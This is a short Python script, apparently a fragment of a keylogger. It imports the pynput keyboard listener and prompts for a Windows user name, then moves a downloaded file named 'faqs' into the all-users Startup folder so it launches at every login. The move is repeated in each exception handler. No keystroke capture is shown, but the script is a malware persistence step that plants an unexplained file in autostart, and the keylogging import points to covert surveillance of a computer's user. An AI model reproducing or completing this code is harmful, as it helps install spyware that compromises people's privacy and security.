import pynput
import os 
import pathlib
import shutil
from pynput.keyboard import Listener


try :
    e = input('Please enter your computer name : ') 
    shutil.move('C:/Users/'+str(e)+'/Downloads/faqs','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')
except TypeError :
    print('This is not your computer name ')
    e = input('Please enter your computer name : ') 
    shutil.move('C:/Users/'+str(e)+'/Downloads/faqs','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')
except FileNotFoundError :
    print('This is not your computer name ')
    e = input('Please enter your computer name : ') 
    shutil.move('C:/Users/'+str(e)+'/Downloads/faqs','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')


